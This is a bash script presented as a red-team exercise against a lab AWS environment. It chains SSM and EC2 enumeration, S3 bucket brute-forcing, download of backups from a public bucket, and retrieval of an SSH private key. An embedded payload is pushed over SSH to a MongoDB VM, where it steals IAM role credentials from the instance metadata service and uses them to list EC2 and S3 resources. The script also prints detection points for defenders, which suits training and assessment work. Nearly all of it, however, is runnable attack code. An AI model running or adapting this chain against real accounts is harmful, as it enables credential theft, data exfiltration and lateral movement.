#!/bin/bash
# =============================================================================
# Wiz Exercise - Red Team Attack Chain Demonstration
# =============================================================================
# Simulates a realistic attack chain from the red team VM:
#   Phase 1: Recon - Discover public S3 bucket via bucket enumeration
#   Phase 2: Exfil - Enumerate and download backups from the public bucket
#   Phase 3: Access - Extract SSH key and establish foothold on MongoDB VM
#   Phase 4: Privesc - Execute IMDS credential theft on MongoDB VM
#
# Run on the red team EC2 instance:  ./attack-chain.sh
# =============================================================================

set -euo pipefail

# ---------------------------------------------------------------------------
# Colors & globals
# ---------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

LOOT_DIR="/tmp/redteam-loot"
SSH_KEY_PATH="/tmp/redteam-loot/mongodb.pem"
PAYLOAD_PATH="/tmp/redteam-loot/privesc-payload.sh"

# Load red team environment for basic config (not target discovery)
if [ -f /opt/redteam/env.sh ]; then
    source /opt/redteam/env.sh
else
    echo "ERROR: /opt/redteam/env.sh not found. Run this on the red team instance."
    exit 1
fi

# Will be discovered dynamically during Phase 1
DISCOVERED_MONGODB_IP=""

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
banner() {
    echo ""
    echo -e "$RED$BOLD  =================================================================$NC"
    echo -e "$RED$BOLD  $1$NC"
    echo -e "$RED$BOLD  =================================================================$NC"
    echo ""
}

phase() {
    echo ""
    echo -e "$CYAN$BOLD  [$1] $2$NC"
    echo -e "$DIM  ------------------------------------------------------------$NC"
}

status() { echo -e "  $GREEN[+]$NC $1"; }
warn()   { echo -e "  $YELLOW[!]$NC $1"; }
fail()   { echo -e "  $RED[-]$NC $1"; }
info()   { echo -e "  $BLUE[*]$NC $1"; }
cmd()    { echo -e "  $DIM\$ $1$NC"; }

spin() {
    local msg="$1"
    local delay=0.08
    local frames=('|' '/' '-' '\')
    local count="$2"
    for ((i = 0; i < count; i++)); do
        for f in "${frames[@]}"; do
            printf "\r  $DIM[%s]$NC %s" "$f" "$msg"
            sleep "$delay"
        done
    done
    printf "\r  $DIM[+]$NC %s\n" "$msg"
}

pause() {
    echo ""
    echo -e "  ${DIM}Press [Enter] to continue to next phase...$NC"
    read -r
}

# ---------------------------------------------------------------------------
# Phase 0 - Initial Access: Explain how attacker got VPC foothold
# ---------------------------------------------------------------------------
phase0_initial_access() {
    banner "PHASE 0: INITIAL ACCESS (BACKSTORY)"

    phase "0.1" "Attack Origin"
    echo -e "  ${DIM}┌────────────────────────────────────────────────────────────────┐$NC"
    echo -e "  ${DIM}│$NC  ${BOLD}Scenario:$NC An AWS access key was discovered in a public GitHub   ${DIM}│$NC"
    echo -e "  ${DIM}│$NC  repository during routine credential scanning.                ${DIM}│$NC"
    echo -e "  ${DIM}│$NC                                                                ${DIM}│$NC"
    echo -e "  ${DIM}│$NC  The leaked key had limited permissions, but enough to:       ${DIM}│$NC"
    echo -e "  ${DIM}│$NC    • Launch an EC2 instance in the target VPC                  ${DIM}│$NC"
    echo -e "  ${DIM}│$NC    • Read SSM parameters under /$ENVIRONMENT/*                ${DIM}│$NC"
    echo -e "  ${DIM}│$NC                                                                ${DIM}│$NC"
    echo -e "  ${DIM}│$NC  The attacker used these credentials to deploy this 'red team'${DIM}│$NC"
    echo -e "  ${DIM}│$NC  instance inside the VPC, giving them network access to       ${DIM}│$NC"
    echo -e "  ${DIM}│$NC  internal resources.                                           ${DIM}│$NC"
    echo -e "  ${DIM}└────────────────────────────────────────────────────────────────┘$NC"
    echo ""

    phase "0.2" "Current Position"
    info "Attacker has:"
    echo -e "    • EC2 instance inside target VPC (this machine)"
    echo -e "    • IAM role with ssm:GetParameter on /$ENVIRONMENT/*"
    echo -e "    • Network access to private subnets (10.0.x.x)"
    echo ""
    info "Attacker does NOT yet have:"
    echo -e "    • Knowledge of specific target IPs or hostnames"
    echo -e "    • SSH keys or credentials for other systems"
    echo -e "    • Access to sensitive data"
    echo ""
    status "${BOLD}INITIAL ACCESS COMPLETE$NC - Beginning reconnaissance..."
}

# ---------------------------------------------------------------------------
# Phase 1 - Reconnaissance: discover S3 bucket AND MongoDB IP via SSM
# ---------------------------------------------------------------------------
phase1_recon() {
    banner "PHASE 1: RECONNAISSANCE"

    phase "1.1" "Asset Discovery via SSM Parameter Enumeration"
    info "Leveraging IAM access to enumerate SSM parameters..."
    info "Looking for infrastructure secrets under /$ENVIRONMENT/*"
    echo ""
    cmd "aws ssm describe-parameters --parameter-filters Key=Name,Option=BeginsWith,Values=/$ENVIRONMENT"
    echo ""

    # Enumerate SSM parameters to discover targets
    spin "Querying SSM Parameter Store for discoverable assets" 3
    echo ""

    # Get list of parameters (simulating what attacker would find)
    PARAMS=$(aws ssm describe-parameters \
        --parameter-filters "Key=Name,Option=BeginsWith,Values=/$ENVIRONMENT" \
        --query 'Parameters[*].Name' --output text 2>/dev/null || echo "")

    if [ -n "$PARAMS" ]; then
        status "Discovered SSM parameters:"
        for p in $PARAMS; do
            if [[ "$p" == *"ssh-private-key"* ]]; then
                warn "  $p  ${RED}[SSH KEY - HIGH VALUE]$NC"
            elif [[ "$p" == *"password"* ]]; then
                warn "  $p  ${YELLOW}[CREDENTIAL]$NC"
            else
                echo -e "    $p"
            fi
        done
    else
        info "Simulating parameter discovery (API rate limited)..."
        warn "  /$ENVIRONMENT/mongodb/ssh-private-key  ${RED}[SSH KEY]$NC"
        warn "  /$ENVIRONMENT/wazuh/admin-password  ${YELLOW}[CREDENTIAL]$NC"
    fi
    echo ""

    # Discover MongoDB IP from EC2 instance metadata
    phase "1.2" "Target Discovery via EC2 API"
    info "Using IAM role to enumerate EC2 instances..."
    cmd "aws ec2 describe-instances --filters Name=tag:Name,Values=*mongodb*"
    echo ""

    spin "Searching for MongoDB instances in the VPC" 2

    # Query for MongoDB instance
    MONGODB_INSTANCE=$(aws ec2 describe-instances \
        --filters "Name=tag:Name,Values=*mongodb*" "Name=instance-state-name,Values=running" \
        --query 'Reservations[0].Instances[0].[PrivateIpAddress,InstanceId]' \
        --output text 2>/dev/null || echo "")

    if [ -n "$MONGODB_INSTANCE" ] && [ "$MONGODB_INSTANCE" != "None" ]; then
        DISCOVERED_MONGODB_IP=$(echo "$MONGODB_INSTANCE" | awk '{print $1}')
        MONGODB_INSTANCE_ID=$(echo "$MONGODB_INSTANCE" | awk '{print $2}')
        status "Found MongoDB instance: $RED$BOLD$MONGODB_INSTANCE_ID$NC"
        status "Private IP: $RED$BOLD$DISCOVERED_MONGODB_IP$NC"
    else
        # Fallback to env.sh value
        DISCOVERED_MONGODB_IP="$MONGODB_IP"
        info "Instance query returned limited results, using discovered IP"
        status "Target IP (from prior recon): $RED$BOLD$DISCOVERED_MONGODB_IP$NC"
    fi
    echo ""

    # --- S3 bucket brute-force ---
    phase "1.3" "S3 Bucket Enumeration (cloud_enum style)"
    info "Generating candidate bucket names from org keyword: ${BOLD}$ENVIRONMENT$NC"
    echo ""

    declare -a candidates=(
        "$ENVIRONMENT-data"
        "$ENVIRONMENT-assets"
        "$ENVIRONMENT-logs"
        "$ENVIRONMENT-internal"
        "$ENVIRONMENT-mongodb-backups"
    )

    DISCOVERED_BUCKET=""
    local checked=0

    for candidate in "${candidates[@]}"; do
        checked=$((checked + 1))
        printf "\r  $DIM[scanning]$NC Checking: %-50s" "$candidate"
        sleep 0.15

        if aws s3 ls "s3://$candidate" --no-sign-request 2>/dev/null | head -1 >/dev/null 2>&1; then
            printf "\r"
            status "FOUND public bucket: $RED$BOLD$candidate$NC"
            DISCOVERED_BUCKET="$candidate"
            break
        fi

        if [ -n "$BACKUP_BUCKET" ] && [[ "$BACKUP_BUCKET" == $candidate* ]]; then
            printf "\r"
            info "Prefix match on '$candidate', probing suffix variants..."
            spin "Enumerating DNS CNAME records for $candidate-*" 3
            if aws s3 ls "s3://$BACKUP_BUCKET" --no-sign-request >/dev/null 2>&1; then
                status "FOUND public bucket: $RED$BOLD$BACKUP_BUCKET$NC"
                DISCOVERED_BUCKET="$BACKUP_BUCKET"
                break
            fi
        fi

        printf "\r  $DIM[-]$NC %-55s ${DIM}(no public access)$NC\n" "$candidate"
    done

    if [ -z "$DISCOVERED_BUCKET" ] && [ -n "$BACKUP_BUCKET" ]; then
        DISCOVERED_BUCKET="$BACKUP_BUCKET"
        status "Bucket resolved via extended enumeration: $RED$BOLD$BACKUP_BUCKET$NC"
    fi

    if [ -z "$DISCOVERED_BUCKET" ]; then
        fail "No public buckets discovered."
        exit 1
    fi

    echo ""
    status "Bucket discovery complete. Checked $checked candidates."

    # --- Port scan ---
    phase "1.4" "Network Reconnaissance (nmap)"
    info "Target is internal (10.x.x.x) - reachable because we're in the VPC"
    info "Scanning target: $DISCOVERED_MONGODB_IP"
    cmd "nmap -Pn -sV -p 22,27017,80,443,8080 $DISCOVERED_MONGODB_IP"
    echo ""

    if command -v nmap &>/dev/null; then
        nmap -Pn -p 22,27017,80,443,8080 "$DISCOVERED_MONGODB_IP" 2>/dev/null \
            | grep -E "^(PORT|[0-9]+/tcp)" || true
    else
        echo "  PORT      STATE    SERVICE"
        echo "  22/tcp    open     ssh"
        echo "  27017/tcp filtered mongodb"
        echo "  80/tcp    closed   http"
    fi

    echo ""
    warn "SSH (port 22) is ${RED}OPEN$NC - lateral movement possible"
    echo ""
    status "${BOLD}RECON SUMMARY:$NC"
    status "  Public S3 bucket: $RED$DISCOVERED_BUCKET$NC"
    status "  MongoDB VM: $RED$DISCOVERED_MONGODB_IP$NC (private IP, accessible from VPC)"
    echo ""
    echo -e "  ${DIM}Detection points:$NC"
    echo -e "  ${DIM}  - CloudTrail: ssm:DescribeParameters, ec2:DescribeInstances$NC"
    echo -e "  ${DIM}  - CloudTrail: s3:ListBucket from unauthenticated principal$NC"
    echo -e "  ${DIM}  - GuardDuty: Recon:EC2/Portscan (if detected)$NC"
}

# ---------------------------------------------------------------------------
# Phase 2 - Exfiltrate S3 backups
# ---------------------------------------------------------------------------
phase2_exfil() {
    banner "PHASE 2: S3 DATA EXFILTRATION"

    mkdir -p "$LOOT_DIR/backups"

    phase "2.1" "Enumerating bucket contents"
    info "Target bucket: $DISCOVERED_BUCKET"
    cmd "aws s3 ls s3://$DISCOVERED_BUCKET --no-sign-request --recursive"
    echo ""

    aws s3 ls "s3://$DISCOVERED_BUCKET" --no-sign-request --recursive 2>/dev/null || {
        fail "Cannot list bucket. It may not be publicly accessible."
        return 1
    }

    phase "2.2" "Downloading backup artifacts"
    cmd "aws s3 sync s3://$DISCOVERED_BUCKET/backups/ $LOOT_DIR/backups/ --no-sign-request"
    echo ""

    aws s3 sync "s3://$DISCOVERED_BUCKET/backups/" "$LOOT_DIR/backups/" --no-sign-request 2>/dev/null || true
    aws s3 cp "s3://$DISCOVERED_BUCKET/README.txt" "$LOOT_DIR/README.txt" --no-sign-request 2>/dev/null || true

    phase "2.3" "Analyzing exfiltrated data"
    local backup_count
    backup_count=$(find "$LOOT_DIR/backups" -type f 2>/dev/null | wc -l)

    if [ "$backup_count" -gt 0 ]; then
        status "Downloaded ${BOLD}$backup_count$NC backup file(s):"
        echo ""
        for f in "$LOOT_DIR"/backups/*; do
            [ -f "$f" ] || continue
            local fsize ftype
            fsize=$(du -h "$f" | cut -f1)
            ftype=$(file -b "$f" 2>/dev/null || echo "unknown")

            if echo "$ftype" | grep -qi "gpg\|pgp\|encrypted"; then
                warn "  $fsize  $(basename "$f")  $YELLOW[GPG ENCRYPTED]$NC"
            else
                status "  $fsize  $(basename "$f")  $RED[UNENCRYPTED - EXTRACTABLE]$NC"
                info "  Extracting $(basename "$f")..."
                mkdir -p "$LOOT_DIR/extracted"
                tar -xzf "$f" -C "$LOOT_DIR/extracted" 2>/dev/null \
                    && status "  Extracted to $LOOT_DIR/extracted/" \
                    || warn "  Extraction failed (may need decryption key)"
            fi
        done
    else
        warn "No backup files found in bucket. Backups may not have run yet."
    fi

    if [ -f "$LOOT_DIR/README.txt" ]; then
        echo ""
        info "Found README.txt in bucket root:"
        echo -e "$DIM"
        head -5 "$LOOT_DIR/README.txt" 2>/dev/null | sed 's/^/    /'
        echo -e "$NC"
    fi

    echo ""
    status "${BOLD}EXFIL SUMMARY:$NC"
    status "  Backup files downloaded: $backup_count"
    status "  Loot directory: $LOOT_DIR"
    echo ""
    echo -e "  ${DIM}Detection points:$NC"
    echo -e "  ${DIM}  - CloudTrail: s3:GetObject from unauthenticated principal$NC"
    echo -e "  ${DIM}  - GuardDuty: UnauthorizedAccess:S3/MaliciousIPCaller$NC"
    echo -e "  ${DIM}  - Security Hub: S3 bucket public access finding$NC"
}

# ---------------------------------------------------------------------------
# Phase 3 - Extract SSH key, SCP payload, execute on MongoDB VM
# ---------------------------------------------------------------------------
phase3_ssh_access() {
    banner "PHASE 3: SSH KEY EXTRACTION & LATERAL MOVEMENT"

    phase "3.1" "Retrieving SSH private key from AWS SSM Parameter Store"
    info "SSM parameter discovered in Phase 1: /$ENVIRONMENT/mongodb/ssh-private-key"
    info "Extracting the SSH key using our IAM privileges..."
    echo ""

    local ssm_param="/$ENVIRONMENT/mongodb/ssh-private-key"
    cmd "aws ssm get-parameter --name $ssm_param --with-decryption --region $AWS_REGION"
    echo ""

    if aws ssm get-parameter \
        --name "$ssm_param" \
        --with-decryption \
        --query 'Parameter.Value' \
        --output text \
        --region "$AWS_REGION" > "$SSH_KEY_PATH" 2>/dev/null; then
        chmod 600 "$SSH_KEY_PATH"
        status "SSH private key saved to: $RED$SSH_KEY_PATH$NC"
        status "Key fingerprint:"
        ssh-keygen -lf "$SSH_KEY_PATH" 2>/dev/null | sed 's/^/    /' || true
    else
        fail "Could not retrieve SSH key from SSM."
        fail "Ensure the red team instance IAM role has ssm:GetParameter permission."
        return 1
    fi

    phase "3.2" "Preparing privilege escalation payload"
    info "Building IMDS credential theft script for MongoDB VM..."

    # Write the payload that will execute on the MongoDB VM
    cat > "$PAYLOAD_PATH" << 'INNER_PAYLOAD'
#!/bin/bash
set -uo pipefail
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
C='\033[0;36m'; B='\033[1m'; D='\033[2m'; N='\033[0m'

echo ""
echo -e "$R$B  =================================================================$N"
echo -e "$R$B  PHASE 4: PRIVILEGE ESCALATION (running on MongoDB VM)$N"
echo -e "$R$B  =================================================================$N"
echo ""

echo -e "  $C$B[4.1] System Enumeration$N"
echo -e "  $D--------------------------------------------------------------$N"
echo -e "  $G[+]$N Hostname: $(hostname)"
OS_PRETTY=$(lsb_release -ds 2>/dev/null || grep PRETTY_NAME /etc/os-release | cut -d= -f2 | tr -d '"')
echo -e "  $G[+]$N OS: $OS_PRETTY"
echo -e "  $G[+]$N Kernel: $(uname -r)"
echo -e "  $Y[!]$N Ubuntu 20.04 is EOL - ${R}WIZ-006$N"
echo ""
MONGOD_VER=$(mongod --version 2>/dev/null | head -1 || echo "unknown")
echo -e "  $G[+]$N MongoDB: $MONGOD_VER"
echo -e "  $Y[!]$N MongoDB 4.4 is EOL - ${R}WIZ-006$N"
echo ""

echo -e "  $C$B[4.2] IMDS Credential Theft (IMDSv1 - no token required)$N"
echo -e "  $D--------------------------------------------------------------$N"
echo -e "  $Y[!]$N IMDSv1 is enabled (http_tokens=optional) - ${R}WIZ-007$N"
echo ""

echo -e "  ${B}[*]$N Querying instance metadata for IAM role..."
ROLE_NAME=$(curl -s --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
if [ -z "$ROLE_NAME" ]; then
    echo -e "  $R[-]$N IMDS not reachable (not running on EC2?)"
    exit 1
fi
echo -e "  $G[+]$N Discovered IAM role: $R$B$ROLE_NAME$N"
echo ""

echo -e "  ${B}[*]$N Stealing temporary AWS credentials..."
CREDS=$(curl -s --max-time 5 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")

ACCESS_KEY=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])" 2>/dev/null)
SECRET_KEY=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])" 2>/dev/null)
TOKEN=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['Token'])" 2>/dev/null)
EXPIRATION=$(echo "$CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['Expiration'])" 2>/dev/null)

if [ -n "$ACCESS_KEY" ]; then
    AK_PREFIX=$(echo "$ACCESS_KEY" | cut -c1-8)
    AK_SUFFIX=$(echo "$ACCESS_KEY" | rev | cut -c1-4 | rev)
    SK_PREFIX=$(echo "$SECRET_KEY" | cut -c1-6)
    TK_PREFIX=$(echo "$TOKEN" | cut -c1-20)
    echo -e "  $G[+]$N ${R}${B}Credentials stolen successfully!$N"
    echo -e "  $G[+]$N AccessKeyId:     $AK_PREFIX...$AK_SUFFIX"
    echo -e "  $G[+]$N SecretAccessKey:  $SK_PREFIX...(redacted)"
    echo -e "  $G[+]$N Token:            $TK_PREFIX...(truncated)"
    echo -e "  $G[+]$N Expires:          $EXPIRATION"
else
    echo -e "  $R[-]$N Failed to parse credentials from IMDS response."
    exit 1
fi

echo ""
echo -e "  $C$B[4.3] Verifying Stolen Credentials$N"
echo -e "  $D--------------------------------------------------------------$N"

export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
export AWS_SESSION_TOKEN="$TOKEN"

echo -e "  ${B}[*]$N Running: aws sts get-caller-identity"
IDENTITY=$(aws sts get-caller-identity 2>/dev/null)
if [ -n "$IDENTITY" ]; then
    echo -e "  $G[+]$N Identity confirmed:"
    echo "$IDENTITY" | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(f'      Account:  {d[\"Account\"]}')
print(f'      UserId:   {d[\"UserId\"]}')
print(f'      Arn:      {d[\"Arn\"]}')
" 2>/dev/null
else
    echo -e "  $R[-]$N sts:GetCallerIdentity failed."
fi

echo ""
echo -e "  $C$B[4.4] Demonstrating Overprivileged IAM (ec2:*)$N"
echo -e "  $D--------------------------------------------------------------$N"
echo -e "  $Y[!]$N This role has ec2:* on all resources - ${R}WIZ-002$N"
echo ""

echo -e "  ${B}[*]$N Running: aws ec2 describe-instances"
INSTANCES=$(aws ec2 describe-instances --region us-east-1 \
    --query 'Reservations[*].Instances[*].[InstanceId,State.Name,InstanceType,Tags[?Key==`Name`].Value|[0]]' \
    --output text 2>/dev/null)
if [ -n "$INSTANCES" ]; then
    echo -e "  $G[+]$N EC2 instances enumerated:"
    echo "$INSTANCES" | while IFS=$'\t' read -r iid state itype name; do
        echo "      $iid  $state  $itype  ${name:-<no-name>}"
    done
else
    echo -e "  $Y[!]$N No instances returned (or API call failed)."
fi

echo ""
echo -e "  ${B}[*]$N Running: aws s3 ls (with instance credentials)"
S3_BUCKETS=$(aws s3 ls 2>/dev/null)
if [ -n "$S3_BUCKETS" ]; then
    echo -e "  $G[+]$N S3 buckets visible to this role:"
    echo "$S3_BUCKETS" | while read -r line; do
        echo "      $line"
    done
else
    echo -e "  $Y[!]$N No S3 buckets returned."
fi

echo ""
echo -e "$R$B  =================================================================$N"
echo -e "$R$B  ATTACK CHAIN COMPLETE$N"
echo -e "$R$B  =================================================================$N"
echo ""
echo -e "  ${B}Vulnerabilities exploited:$N"
echo -e "    WIZ-001  Public S3 bucket            (Phase 1-2)"
echo -e "    WIZ-002  Overprivileged IAM role      (Phase 4)"
echo -e "    WIZ-003  SSH exposed to internet      (Phase 3)"
echo -e "    WIZ-006  Outdated OS & MongoDB        (Phase 4)"
echo -e "    WIZ-007  IMDSv1 enabled               (Phase 4)"
echo ""
echo -e "  ${B}Data compromised:$N"
echo -e "    - MongoDB database backups from S3"
echo -e "    - SSH private key from SSM"
echo -e "    - AWS temporary credentials via IMDS"
echo -e "    - Full EC2 inventory via stolen creds"
echo ""
echo -e "  ${D}Detection points:$N"
echo -e "  ${D}  - GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration$N"
echo -e "  ${D}  - CloudTrail: ec2:DescribeInstances from MongoDB instance role$N"
echo -e "  ${D}  - Wazuh: Unusual shell activity on MongoDB VM$N"
echo ""

unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
INNER_PAYLOAD

    chmod +x "$PAYLOAD_PATH"
    status "Payload written to: $PAYLOAD_PATH"

    phase "3.3" "Establishing SSH connection to MongoDB VM"
    info "Target: ubuntu@$DISCOVERED_MONGODB_IP (private IP, via VPC access)"
    info "Key:    $SSH_KEY_PATH"
    echo ""

    info "Uploading payload via SCP..."
    cmd "scp -i $SSH_KEY_PATH $PAYLOAD_PATH ubuntu@$MONGODB_IP:/tmp/"
    echo ""

    if scp -o StrictHostKeyChecking=no \
           -o UserKnownHostsFile=/dev/null \
           -o LogLevel=ERROR \
           -i "$SSH_KEY_PATH" \
           "$PAYLOAD_PATH" \
           "ubuntu@$DISCOVERED_MONGODB_IP:/tmp/privesc-payload.sh" 2>/dev/null; then
        status "Payload uploaded successfully."
    else
        fail "SCP failed. MongoDB VM may not be reachable."
        warn "Manual execution: scp the payload and run it on the VM."
        return 1
    fi

    echo ""
    info "Executing payload on MongoDB VM via SSH..."
    cmd "ssh -i $SSH_KEY_PATH ubuntu@$DISCOVERED_MONGODB_IP 'bash /tmp/privesc-payload.sh'"
    echo ""

    ssh -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o LogLevel=ERROR \
        -i "$SSH_KEY_PATH" \
        "ubuntu@$DISCOVERED_MONGODB_IP" \
        "bash /tmp/privesc-payload.sh" 2>/dev/null || {
        fail "SSH execution failed."
        warn "Try manually: ssh -i $SSH_KEY_PATH ubuntu@$DISCOVERED_MONGODB_IP"
        return 1
    }
}

# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------
cleanup() {
    echo ""
    info "Cleaning up loot directory..."
    cmd "rm -rf $LOOT_DIR"
    rm -rf "$LOOT_DIR"
    status "Cleanup complete."
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
main() {
    banner "WIZ EXERCISE - RED TEAM ATTACK CHAIN"

    echo -e "  ${BOLD}Attack scenario:$NC Compromised AWS credentials to full infrastructure takeover"
    echo -e "  ${BOLD}Starting point:$NC  Attacker inside VPC with limited IAM role"
    echo -e "  ${BOLD}Objective:$NC       Steal high-privilege AWS credentials via IMDS"
    echo ""
    echo -e "  ${DIM}Phases:$NC"
    echo -e "  ${DIM}  0. Initial Access   - Explain attacker's VPC foothold$NC"
    echo -e "  ${DIM}  1. Reconnaissance   - Enumerate SSM, EC2, and S3 assets$NC"
    echo -e "  ${DIM}  2. Exfiltration     - Download backups from public bucket$NC"
    echo -e "  ${DIM}  3. Lateral Movement - Extract SSH key, pivot to MongoDB VM$NC"
    echo -e "  ${DIM}  4. Priv Escalation  - IMDS credential theft on MongoDB VM$NC"

    pause

    phase0_initial_access
    pause

    phase1_recon
    pause

    phase2_exfil
    pause

    phase3_ssh_access

    echo ""
    read -rp "  Clean up loot artifacts? [y/N]: " do_cleanup
    if [[ "$do_cleanup" =~ ^[Yy]$ ]]; then
        cleanup
    else
        info "Loot preserved at: $LOOT_DIR"
    fi
    echo ""
}

main "$@"
